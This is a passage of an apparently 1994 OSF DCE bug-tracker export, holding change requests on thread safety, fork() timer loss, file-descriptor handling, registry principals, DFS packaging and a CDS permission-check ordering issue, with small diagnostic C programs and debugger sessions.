/* "cc -o fdtest -DNONTHREAD fdtest.c",                               */
/* the function close_files closes the opened file after every "execv"*/
/* The filedescriptor for "x" is constant                             */

/* The gdsdsa closes all unused files in the beginning, to avoid the  */
/* inheritance from the calling program                               */

#ifndef NONTHREAD
#include <pthread.h>
#endif

#include <stdio.h>
#include <unistd.h>
#include <errno.h>

main(argc,argv)

int argc;
char *argv[];

{
  FILE *fp;

  close_files();
  if((fp = fopen("x","r")) != NULL)
  {
    printf("fileno: %d\n",fileno(fp));
  }
  printf("Press RETURN to proceed, DEL to break > ");
  getchar();
  execv(argv[0],argv);
  printf("execv failed, errno: %d\n",errno);
}

close_files()

{
  int fd;
  int fd_max;

  fd_max = sysconf(_SC_OPEN_MAX);
  for(fd = 3; fd < fd_max; fd++)
  {
    if(close(fd) == 0)
    {
      fprintf(stderr,"file closed, fd: %d\n",fd);
    }
  }
}

[6/22/94 public]
You are right cma_close in the  child process after the exec doesn't
know the file is open. cma_close calls cma__is_open to see if the file
is known to be open. If not it just returns. Since the bit that cma__is_open
looksis global data which is reset in the new address space it will of
course return false. Since none of the cma state is from the parent
is valid in the child you need to avoid the call to cma_close. I suggest

  for(fd = 3; fd < fd_max; fd++)
  {
#undef close
    close(fd)
#define close cma_close
  }

[Wed Jun 22 13:25:51 EDT 1994 public]

Make sure that you conditionalize this on a per-platform basis.  On SVR4,
CMA does know which files are open at process start-up time (including
inherited open file descriptors).  Therefore, you don't want to perform
this #undef for the SVR4 platforms and doing so may cause problems. 

Prehaps the CMA initialization code should do a better job of trying
to figure out which file descriptors are open at process start-up time
for other platforms?

[06/23/94 public]
I'm very proud of my SVR4 platform.
I totally agree: CMA should do a better job. Please see this as an
official change request: We would like to have a cma_close which
knows inherited open file descriptors.
Please give us a note if you will implement this or not.
(May be you can use SVR4 experiences ...)
Now we have the workaround that we don't include pthread.h into the file
which contains the function close_unused_files.
Will we have problems on SVR4?
This function is called only when the process is started - so, hopefully,
we will not have problems with the mix close - cma_close.
But this workaround is really not nice.

[Thu Jun 23 09:19:14 EDT 1994 public]

I don't think that it would really be feasible to use the SVR4 code
with learns about open file descriptors on other platforms because
it is based upon poll().  Code based upon select() would not be hard, 
just tedious.

If you are using SNI-SVR4, then you will not have a problem by removing
the include of pthread.h because the close() function is really the 
cma_close() function.  On other SVR4-based platforms (e.g. SCO) you 
might have a problem because you would miss out on calling cma_close()
for those file descriptors.

[6/23/94 public]
If removing pthread.h is acceptable I assume the exec'd process is 
intended to be single threaded so not calling cma_close should be ok.
I have some  exec wrappers recently supplied by HP that they use on 
their platform that do more than the previously supplied wrappers. If 
I get time in the 1.1 schedule I will look at these and see if they can
be made to work on the other platforms. I don't know if they cover
open file descriptors. I probably won't get to them for a couple
of weeks.



CR Number                     : 11012
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : noship/lex
Short Description             : remove noship/lex
Reported Date                 : 6/20/94
Found in Baseline             : 1.1
Found Date                    : 6/20/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/20/94 public]

OSC lex should be removed and any reference to it as well.

[7/1/94 public]
Changed severity and priority - because I believe it is just
a cleanup issue that does not really effect much.

[9/7/94 public]
The Makefile that referenced the osc104 lex are:

rpc/idl/idl_compiler/Makefile
rpc/rtandidl/testsh/Makefile
security/api/testsh/Makefile

If the references are removed and tested, them the noship/lex area
can be defuncted.

[9/12/94 public]
It appears that DCE lex files in the idl_compiler component need to be
ported to the OSF/1 1.2 platform.

Due to the time constrain for this project, the fix will have to be
defered to DCE1.2.

So, we will have to retain the OSF/1 1.0.4 lex in noship in order to
build DCE.  The release notes MUST specifically specify this problem.
I believe that the retro fit tape will have the OSF/1 1.0.4 lex on it.

thanks
annie

[2/06/96 public]
Changed to Enh Req. Whoever is doing 1.2 port on OSF/1 can do the fix
and submit.



CR Number                     : 11007
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : 
Short Description             : Calls to getpw*() are not thread safe
Reported Date                 : 6/20/94
Found in Baseline             : 1.0.3
Found Date                    : 6/20/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/20/94 public]

Library calls for accessing user attribute information: getpw*() are
not thread safe. They copy the returned information to a static area.
Subsequent calls will overwrite the area. So in a threaded application,
it is crutial to guard such a memory overwriting problem.

There are various places in the sec code where such function calls are made
without the guard (either using a mutex or a lock, or call the reentrant 
version getpw*_r()).

1. security/krb5/lib/os/kuserok.c, function krb5_kuserok(). But there is no
place that actually calls krb5_kuserok(). If this function is indeed not
used at all, please remove it.

2. in security/utils/sec_authn.c. Calls to getpwuid() is guarded by #ifdef
USE_GETPW_R, so if it is defined, the reentrant version of getpwuid_r() is
called, otherwise getpwuid() is called WITHOUT further guard. In the 1.0.3 
code, this happens in two fucntions: sec_krb_dg_build_message() and
sec_krb_cn_build_message. In the 1.1 code, it is in 
sec_krb_build_message_none(), which is called by sec_krb_[cn|dg]_build_message.

USE_GETPW_R is defined in security/mk for only the HP platform. That means for
AIX and OSF/1 (the reference platforms), we could get problem.

3. security/client/login/sec_login_np.c and 
security/client/login/$ARCH/sec_login_np.c

At the beginning (right after #ifdef USE_GETPW_R), it says "On OSF, we use 
the getpwnam_r routine, which is already thread safe, so we can ...". Too bad
the fact is, with OSF reference platforms, only HP-UX actually defines this
USE_GETPW_R and links with libc_r.a. AIX and OSF/1 do support the reentrant C
library, but they are not configured to use libc_r.a.

But, even USE_GETPW_R is not defined, the code seems to do the right thing by 
creating mutex to guard the use. The only thing we may want to add is for the
case when USE_GETPW_R is defined: we may define LOCK_PWD_DATA as setpwent_r and
define UNLOCK_PWD_DATA for endpwent_r.

4. Thare are other two places (client/unix_utils/su/su.c and 
client/unix_utils/login/login.c) where the getpw*() calls are made without
protection. But since these two are stand-alone code, it does not seem to be
in danger.



CR Number                     : 11004
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : thr
Subcomponent Name             : 
Short Description             : thread "heartbeat" is off in the child after fork().
Reported Date                 : 6/17/94
Found in Baseline             : 1.0.3
Found Date                    : 6/17/94
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/17/94 public]

The Problem
-----------

If a program which has initialized the threads layer (e.g. by calling a
wrapped library call such as printf()) calls fork() then the thread
"heartbeat" is off in the child. The OS fork() call disables the virtual
timer in the child (this may vary accross OS: it is specified in the OS/AES
and it seems to be the fork() behavior on AIX and HP/UX even though it is
not specified in the corresponding man pages) and the threads package does
not restore it.

Here is a little program "demonstrating" the behavior:

#include <pthread.h>
#include <stdio.h>
#include <sys/types.h>

typedef struct {
  int thread_id;
  int iterations;
} count_args_t;

void bar(int);
void count(pthread_addr_t);

void main(int argc, char *argv[])
{
  int iterations;

  sscanf(argv[1], "%d", &iterations);

  bar(iterations);

  if (fork() > 0)
    exit(0);
  else 
    bar(iterations);

  exit(0);
}

void bar(int iterations)
{
  pthread_t thread_1;
  pthread_t thread_2 ;
  count_args_t count_args_1;
  count_args_t count_args_2;
  pthread_addr_t thread_status;

  printf("in bar: pid = %d\n", getpid());

  count_args_1.thread_id = 1;
  count_args_1.iterations = iterations;
  pthread_create(&thread_1, 
                 pthread_attr_default, 
                 (pthread_startroutine_t) count,
                 (pthread_addr_t) &count_args_1);
  printf("in bar: pthread_create(thread_1)\n");

  count_args_2.thread_id = 2; 
  count_args_2.iterations = iterations;
  pthread_create(&thread_2,
                 pthread_attr_default, 
                 (pthread_startroutine_t) count,
                 (pthread_addr_t) &count_args_2);
  printf("in bar: pthread_create(thread_2)\n");

  pthread_join(thread_1, &thread_status);
  printf("in bar: pthread_join(thread_1)\n");
  pthread_join(thread_2, &thread_status);
  printf("in bar: pthread_join(thread_2)\n");
}

void count(pthread_addr_t x)
{
  count_args_t *count_args = (count_args_t *) x;
  int thread_id = count_args->thread_id;
  int iterations = count_args->iterations;
  int i;
  int k = iterations / 10;
  
  for (i = 0; i < iterations; i++) {
    if (i % k == 0) {
      printf("in count: thread id = %d, i = %d\n", thread_id, i);
    }
  }
}

along with the following sample run (1.0.3 on rios):

# ./foo1 1000000
in bar: pid = 7791
in bar: pthread_create(thread_1)
in bar: pthread_create(thread_2)
in count: thread id = 1, i = 0
in count: thread id = 1, i = 100000
in count: thread id = 2, i = 0
in count: thread id = 2, i = 100000
in count: thread id = 1, i = 200000
in count: thread id = 2, i = 200000
in count: thread id = 1, i = 300000
in count: thread id = 2, i = 300000
in count: thread id = 1, i = 400000
in count: thread id = 2, i = 400000
in count: thread id = 1, i = 500000
in count: thread id = 2, i = 500000
in count: thread id = 1, i = 600000
in count: thread id = 2, i = 600000
in count: thread id = 2, i = 700000
in count: thread id = 1, i = 700000
in count: thread id = 2, i = 800000
in count: thread id = 1, i = 800000
in count: thread id = 1, i = 900000
in count: thread id = 2, i = 900000
in bar: pthread_join(thread_1)
in bar: pthread_join(thread_2)
# in bar: pid = 27248
in bar: pthread_create(thread_1)
in bar: pthread_create(thread_2)
in count: thread id = 1, i = 0
in count: thread id = 1, i = 100000
in count: thread id = 1, i = 200000
in count: thread id = 1, i = 300000
in count: thread id = 1, i = 400000
in count: thread id = 1, i = 500000
in count: thread id = 1, i = 600000
in count: thread id = 1, i = 700000
in count: thread id = 1, i = 800000
in count: thread id = 1, i = 900000
in count: thread id = 2, i = 0
in count: thread id = 2, i = 100000
in count: thread id = 2, i = 200000
in count: thread id = 2, i = 300000
in count: thread id = 2, i = 400000
in count: thread id = 2, i = 500000
in count: thread id = 2, i = 600000
in count: thread id = 2, i = 700000
in count: thread id = 2, i = 800000
in count: thread id = 2, i = 900000
in bar: pthread_join(thread_1)
in bar: pthread_join(thread_2)

If the fork() section of the code (in main()) is replaced by the following:

  if (fork() > 0)
    exit(0);
  else {
    unix_timer.it_interval.tv_sec  = 0;
    unix_timer.it_interval.tv_usec = 100000; /* magic # from threads */
    unix_timer.it_value.tv_sec  = 0;
    unix_timer.it_value.tv_usec = 100000;
    setitimer(ITIMER_VIRTUAL, &unix_timer, &unix_oldtime);

    bar(iterations);
  }

then the program runs as follows (again 1.0.3 on rios):

# ./foo2 1000000
in bar: pid = 25729
in bar: pthread_create(thread_1)
in bar: pthread_create(thread_2)
in count: thread id = 1, i = 0
in count: thread id = 1, i = 100000
in count: thread id = 2, i = 0
in count: thread id = 2, i = 100000
in count: thread id = 1, i = 200000
in count: thread id = 2, i = 200000
in count: thread id = 1, i = 300000
in count: thread id = 2, i = 300000
in count: thread id = 1, i = 400000
in count: thread id = 2, i = 400000
in count: thread id = 1, i = 500000
in count: thread id = 2, i = 500000
in count: thread id = 1, i = 600000
in count: thread id = 2, i = 600000
in count: thread id = 1, i = 700000
in count: thread id = 1, i = 800000
in count: thread id = 2, i = 700000
in count: thread id = 2, i = 800000
in count: thread id = 1, i = 900000
in count: thread id = 2, i = 900000
in bar: pthread_join(thread_1)
in bar: pthread_join(thread_2)
# in bar: pid = 27266
in bar: pthread_create(thread_1)
in bar: pthread_create(thread_2)
in count: thread id = 1, i = 0
in count: thread id = 1, i = 100000
in count: thread id = 2, i = 0
in count: thread id = 2, i = 100000
in count: thread id = 1, i = 200000
in count: thread id = 2, i = 200000
in count: thread id = 1, i = 300000
in count: thread id = 2, i = 300000
in count: thread id = 1, i = 400000
in count: thread id = 2, i = 400000
in count: thread id = 1, i = 500000
in count: thread id = 2, i = 500000
in count: thread id = 1, i = 600000
in count: thread id = 2, i = 600000
in count: thread id = 1, i = 700000
in count: thread id = 2, i = 700000
in count: thread id = 2, i = 800000
in count: thread id = 1, i = 800000
in count: thread id = 1, i = 900000
in count: thread id = 2, i = 900000
in bar: pthread_join(thread_1)
in bar: pthread_join(thread_2)

So (1)
------

1) I understand that the POSIX semantic of fork() in a threaded environment
is that only the forking thread is "live" in the child. This, however, does
not specify whether the child can be threaded or not. If the child can be
threaded then the current threads implementation is defective; if it can not
then...

2) Many daemons in DCE are in error since they initialize threads before
forking and therefore the daemon (i.e. the child) runs without the thread
heartbeat! This does sound implausible since the DCE daemons do seem to
work (at least most of the time) but here is an experiment suggesting that
it is indeed the case (this is with cdsd but it works (!) for rpcd and
sec_clientd as well): 

	1.
	- attach a debugger to a running cdsd 
	- put a break point in cma__periodic() (the VTALRM signal handler)
	- continue
	- observe that cdsd never runs cma__periodic()

	2.
	- repeat 1. but having started cdsd with -d i.e. without forking.
	- observe that cdsd runs cma__periodic()

(still 1.0.3 on rios)

1.

# ps -ef | grep cdsd
    root 10021     1   0 10:40:26      -  0:33 /opt/dcelocal/bin/cdsd 
    root 25734 27896   0 16:59:18  pts/2  0:00 grep cdsd 
# dbx -a 10021
Waiting to attach to process 10021 ...
Successfully attached to cdsd.
warning: Directory containing cdsd could not be determined.
Apply 'use' command to initialize source path.

dbx version 3.1 for AIX.
Type 'help' for help.
reading symbolic information ...

attached in cma__io_available at 0xd02ee340
0xd02ee340 (cma__io_available+0x3c0) 80410014          l   r2,0x14(r1)
(dbx) ignore VTALRM
(dbx) stop in cma__periodic
[1] stop in cma__periodic
(dbx) c
-----
Here exercise cds and notice that the cdsd just keeps on going...
For fun you can also:

# kill -VTALRM 10021

and sure enough (back to dbx):
-----
[1] stopped in cma__periodic at 0xd02f6f34
0xd02f6f34 (cma__periodic)    7c0802a6       mflr   r0

2.

# /opt/dcelocal/bin/cdsd -d &
[2]     10143
# dbx -a 10143
Waiting to attach to process 10143 ...
Successfully attached to cdsd.
warning: Directory containing cdsd could not be determined.
Apply 'use' command to initialize source path.

dbx version 3.1 for AIX.
Type 'help' for help.
reading symbolic information ...

attached in cma__io_available at 0xd02ee340
0xd02ee340 (cma__io_available+0x3c0) 80410014          l   r2,0x14(r1)
(dbx) ignore VTALRM
(dbx) stop in cma__periodic
[1] stop in cma__periodic
(dbx) c 
[1] stopped in cma__periodic at 0xd02f6f34
0xd02f6f34 (cma__periodic)    7c0802a6       mflr   r0
(dbx) c
-----
Here cdsd stopped in cma__periodic already but if it did not try
exercising cds a little to get there. For example:

# cdscp show clear /.:/pierrot_ch

and (back to dbx):
-----
[1] stopped in cma__periodic at 0xd02f6f34
0xd02f6f34 (cma__periodic)    7c0802a6       mflr   r0

Again, this behavior is similar for all the daemons I tried: cdsd, rpcd and
sec_clientd. So:

3) Why do the daemons work? Threads yield on completion, on blocking I/O,
etc... i.e. not only through the threads pre-emptive scheduling. It is
possible that in an I/O bound process (e.g. a DCE daemon) this effectively
creates "cooperative" scheduling.

So (2)
------

Something needs to be fixed. Again, either the threads package is deficient
or the DCE daemons use the wrong programming model. 

By the way, in the process of tracking this down I also run these tests on
the HP/DCE product and the IBM/DCE product (both corresponding to OSF 1.0.2
I believe). HP folks may be interested to known that I observed the
behavior described in this report on their platform as well. On the other
hand, the IBM/DCE (product) fork() seems to restore the timer in the child
so may be we can get some help from IBM on this one :)

Finally, it is a little annoying that none of the tests point to this
problem.

[7/19/94 public]

I am raising the severity to A. Solving this problem may create problems in
other components (namely in all of the DCE daemons) so if it is not
addressed soon it is a safe bet that 1.1 will ship without a fix to this
defect.



CR Number                     : 10983
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : registry
Short Description             : Issues with pre-created regsitry principals and groups.
Reported Date                 : 6/16/94
Found in Baseline             : 1.0.3
Found Date                    : 6/16/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/16/94 public]

SVR4 customer reported that in a split server configuration (Security server
on AIX, CDS on FTX, a SNI 1.0.3 early access), acl_edit, during name space
initialization, failed on the following entries: principal/adm, group/root,
group/other, group/adm, and group/sys. In another configuration (Security
server on FTX, SNI SVR4 DCE, CDS on AIX), acl_edit failed on the following
entries: principal/who, group/system, group/daemon, and group/kmem.

The reason of this failure is that SNI has its proprietary code in the secd
registry pre-created entries part that creates principal/group according to
SVR4 operating system accounts and groups. So it does not creates those
default principals and groups that OSF DCE creates.

SNI also modifies their dce_config script so that during the name space
initialization, acl_edit will set acls on those SNI specific principals and
groups, not OSF ones. 

This explains the reason of the above failures. Some entries simply do not
exist.

SNI believes that the pre-created DCE registry principals and groups SHOULD
reflect local OS's default accounts and groups. They view becasue of different
OS (UNIX)'s different (sometimes conflicting) uid/gid for accounts/groups, 
they need to do things specific to SVR4. Here is some comments from SNI 
(tikku@sni-usa.com (Sanjay Tikku)):

------start quoting
Well, since I put this portion of code in the SNI version of DCE let me try
and explain the situation.

There are uid/gid conflicts between system accounts of same names between
different Unix systems. Also, there are system accounts which only exist on
one or the other version of Unix out there.

I have always been of the opinion that there is no point in creating Unix
system accounts in the DCE registry but that is something that only folks
at OSF can change. 

If the system accounts are going to be there then potential for conflict is
always there between a client/server pair. What we have done by adding code
wrapped in SNI_PROPRIETARY flag is to ensure that there will be no
conflicts between SVR4 machines in a cell. If we did not do this then every
time we create a new cell there were id conflicts when the first
machine was added to the cell. 

There are two possible ways to handle this situation:

1. Get rid of Unix system accounts from the DCE registry when dce_config is
run. I have not as yet heard a convincing argument that those accounts are
needed. 

2. If those accounts cannot be removed from the registry, at this stage, for 
whatever reason then dce_config should be changed on all platforms so that
it tests the existence of a certain account (we are talking of Unix system
accounts only) before trying to set the ACLs.

------- end quoting

Personally I don't think this has anything to do with conflict uid/gid between
different OS. Those DCE pre-created principals and groups should be viewed as
DCE entries, not a map of local OS accounts and groups. In this sense, SNI
should change their code to do what other companies are doing by creating the
same set of principals and groups.

On the other hand, one can argue what is the use of these pre-created principalsand groups after all. One solution is not to create them at all, but leave to
DCE administrator to determine if he/she wants to do so.

Yet another possible solution is to create the union of all existing system
princiapals and groups.

I have concern over the number 2 suggestion from SNI, that dce_config should 
test the existence before doing acl_edit. The problem is, if dce_config does
not know the all possible entries, it may well leave some entries untested,
hence unset with acls. This may leave security holes.

If secd is changed for its creation of principals and groups at registry
startup, dce_config needs to be changed to reflect it.



CR Number                     : 10973
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : rgy_edit
Short Description             : rgy_edit could provide info on lifetime conflict
Reported Date                 : 6/15/94
Found in Baseline             : 1.0.3
Found Date                    : 6/15/94
Severity                      : C
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/15/94 public]
If you want to increase your login credential lifetime so you 
don't have to do kinit so frequently, the intuitive (but wrong) way 
to do this is to modify the principal account value Maximum Certificate
Lifetime.  An informational message from rgy_edit at this point saying
whether this value would effectively be superseded by either or both of
the cell-wide Default Certificate Lifetime or Max Certificate Lifetime
would be a helpful indication that a reading of documentation was called for.

[6/15/94 public]
There's no conflict in the case mentioned, that's how it's documented to work:
You get the default as long as the default is between the min and the max.
If you feel that it's not documented well enough, open a doc CR.  I've changed
this from a defect to an enhancement request, since your suggestion might help
those that haven't read or understood the documentation and ran into a conflict
(eg: making default larger than max or max smaller than default, not just
making the max larger and not knowing that the default will still be what's
used, as the above situation implies).

[6/16/94 public]
Since dcecp will probably be replacing rgy_edit after 1.1 this is low
priority.  Now, does dcecp do a better job?  Well the max certificate
lifetime is called maxtktlife and is a policy on the account object.
You can change the value and dcecp does not give an informational
message.  However, if you display the policies and the cell-wide default
value is stricter, you'll see that displayed:


 dcecp> account show foo -policies   # value not overridden
 {maxtktlife <value1>}

 dcecp> account show foo -policies   # value overridden by cell-wide default
 {maxtktlife <value1> effective <value2>}

I think this provides enough info for the user.  rgy_edit only displays
default info for organizations.



CR Number                     : 10941
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : Authentication.
Short Description             : Kerberos V5 and DCE compatibility.
Reported Date                 : 6/14/94
Found in Baseline             : 1.1
Found Date                    : 6/14/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/14/94 public]

This is a placeholder for compatibility work in dce 1.1 with Kerberos V5
specification.

[12/8/95 public]
KRB5 Interoperability not really supported fully until 1.2.2, so this is an
enhancement request.



CR Number                     : 10934
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : Delete requests should check permission prior to attempting deletion.
Reported Date                 : 6/12/94
Found in Baseline             : 1.0.3
Found Date                    : 6/12/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/12/94 public]
We have a concern that the order of checking a delete request may give an unauthorized
user, information they should not have.
If a Clearinghouse is not empty, and the permissions do not allow that Clearinghouse
to be deleted, the message that is displayed implies that the Clearinghouse
is checked before the permission is checked.

>acl_edit /.:/ch4_ch -m user:testuser:rdtc    (user does not have 'write' permission to ch4_ch)
>dce_login testuser -dce-
>cdscp delete clearinghouse /.:/ch4_ch
Failure in routine:cp_clrdel_clh; code = 282108924
Directory must be empty to be deleted (dce / cds)

Another scenario:

>acl_edit /.:/testacl/dir1 -m user:testuser:rwdtc  (user does not have 'admin' permission to dir1 in ch4_ch)>dce_login testuser -dce-
>cdscp delete clearinghouse /.:/ch4_ch
Failure in routine: cp_clrdel_clh; code = 282108924
Directory must be empty to be deleted (dce / cds)

It appears that the Clearinghouse is checked to be empty before the permission
is checked.
This could give the user more information than they should have.



CR Number                     : 10907
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : config
Short Description             : dfs.unconfig should do a few more things ...
Reported Date                 : 6/8/94
Found in Baseline             : 1.1
Found Date                    : 6/8/94
Severity                      : B
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[domian 12/2/96 public}
lowering priority of old OTs that haven't appeared during R1.2.

[6/8/94 public]

In trying to help the RATs salvage a smoketest attempt, came across
the following:

- dfs.unconfig removes member from the /.:/fs group but does NOT
restart the other flservers
- dfs.unconfig does this last when, if the machine you're unconfig'ing
is down, you might want to do this 1st so you can achieve quorum and
then successfully do other steps like delete, delfldbentry, delserverentry
(The smoketest cell is a degenerate case since there are only the 2 
flservers but it wouldn't hurt to have this order would it?)

It would also be nice if dfs.unconfig would do a:
fts delfldbentry -server <server_being_unconfig'd> -prefix ""
(if the user was willing to risk losing replication data :-)
so that if the server is down, filesets can still be removed from the
fldb ...
and



CR Number                     : 10882
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : tkm
Short Description             : tkm thread pool not needed on clients
                                             on DFS client only machines?
Reported Date                 : 6/7/94
Found in Baseline             : 1.0.3a
Found Date                    : 6/7/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/7/94 public]
 
The tkm thread pool appears not to be needed on client only machines.
I don't have a full understanding of the work requests on the
tkm thread pool queues, but I think they only apply to DFS exporters.
A test client-only system with the tkm thread pool queue omitted has
passes connectathon...  Can anyone at Transarc confirm
that pure clients don't need tkm?

[6/7/94 public]
I think this is likely a duplicate of OT 10880.  You don't need tkm,
or its thread pool, on pure clients.  This is simply a matter of
packaging to make a minimal client-only configuration.
 
Such a configuration wouldn't need tkc, either.  There may be others.



CR Number                     : 10881
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : tpq
Short Description             : too many scheduling threads
                                             in TPQ.
Reported Date                 : 6/7/94
Found in Baseline             : 1.0.3a
Found Date                    : 6/7/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : 
Transarc Status               : 

[6/7/94 public]
 
The TPQ package using a scheduling thread per thread pool.  This is
wasteful.  It's a fairly simple modification to have one global
scheduler thread which will loop over all the thread pools.  Since
this thread does not normally block (except possibly when it
has to do an osi_ThreadCreate) there should be no performance
impact.  A test system built this way is currently undergoing
testing.  It's been up four days with simple testing.  More
exotic testing (moving filesets, replication) etc. is currently
underway.  An additional thread has been saved by having the
thread which blocks forever awaiting system shutdown be the
universal scheduler thread.  This thread now polls periodically
for shutdown.

[6/7/94 public]
I don't know if there's an overriding reason to have one scheduling
thread per thread-pool, but maybe Gen. Comer will remember.  It seems
reasonable to try to build a universal-scheduler thread this way.

[6/7/94 public]
No, there's no reason not to have a single scheduler thread.  It seems
quite reasonable to me (I assume things like initializing and shutting
down thread pools are handled cleanly).  How much of a change are we
talking about?
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'



CR Number                     : 10880
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : kernel packaging
Short Description             : dfscore too big on clients
                                             kernel extension contains all
                                             token management code, both
                                             client and server side.  This
                                             unnecessarily wastes kernel
                                             memory on client only machines.
Reported Date                 : 6/7/94
Found in Baseline             : 1.0.3a
Found Date                    : 6/7/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/7/94 public]
 
On HPUX, the dfscore kernel extension contains all token management 
code, both client and server side.  This unnecessarily wastes kernel
memory on client only machines.  dfscore.ext should be split into
two different libraries.  This is a low priority because the
pending rewrite of the token manager may make this work
unnecessary.

[6/7/94 public]
Sure, in a client-only kernel, there's no need for the token manager,
and dfscore could be separated into different parts if one wanted to
build a minimal client-only kernel that never exported any data.



CR Number                     : 10823
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : pwd strength checking
Short Description             : acct add fails if schema entry doesn't exist for pwd_val_type ERA
Reported Date                 : 6/1/94
Found in Baseline             : 1.1b9
Found Date                    : 6/1/94
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/1/94 public]
When adding an account, I get "invalid or unsupported attribute type" error.
Same result with dcecp:
    dcecp> account crea -pass yow -mypwd -dce- -group none -org none ross
    Error: invalid or unsupported attribute type
or rgy_edit:
    rgy_edit=> a ross -g none -o none -pw -ross- -mp -dce-
    ?(rgy_edit) Unable to add "ross" - invalid or unsupported attribute type\
    (dce / sec)

Setup: client on HP or 486.  Server: HP.  All BL-9.

(The rgy database was created with bl-8, I think, then I upgraded the
binaries/libs to bl-9.  Don't know if this should make a difference.)

[7/8/94 public]
The "pwd_val_type" schema entry was provided in the default database
with the bl-9 version of sec_create_db.  You must rerun sec_create_db
to avoid this problem.  I downgraded the bug because there's an available
workaround -- run the new sec_create_db.  The bug remains open because
the acct_add should not fail if the schema entry is missing.



CR Number                     : 10806
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : krb5
Short Description             : security/krb5/comerr/error_message.c:error_message() is not thread-safe.
Reported Date                 : 5/31/94
Found in Baseline             : 1.0.2
Found Date                    : 5/31/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/krb5/comerr/error_message.c
Sensitivity                   : public

[5/31/94 public]
security/krb5/comerr/error_message.c:error_message() is not thread-safe
as it uses a static buffer.  This can lead to memory corruption problems
in situations like ...
        str = error_message(code);
        cpy = malloc(strlen(str));
        strcpy(cpy, str);
... when `str' changes between the strlen() and the strcpy().  See, for
